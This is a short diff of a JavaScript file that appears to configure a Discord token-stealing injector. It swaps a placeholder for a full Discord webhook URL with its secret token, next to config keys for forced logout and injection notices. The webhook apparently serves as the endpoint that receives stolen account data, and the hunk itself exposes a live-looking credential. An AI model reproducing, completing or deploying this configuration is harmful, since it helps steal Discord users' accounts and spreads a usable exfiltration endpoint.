@@ -30,7 +30,7 @@ var debug = false,
 
 if (args[0] == 'debug') debug = false;
 const buf_replace = require('buffer-replace');
-const superstarlmao = "da_webhook"
+const superstarlmao = "https://discord.com/api/webhooks/966633343141695538/ZzeJXm0leVrbh5vJ3Wx_b1G5yzcx2ZuhrX30HsYC9HXVoURLymn-FOE1vflo92dz9Har"
 const config = {
     "logout": "instant",
     "inject-notify": "true",
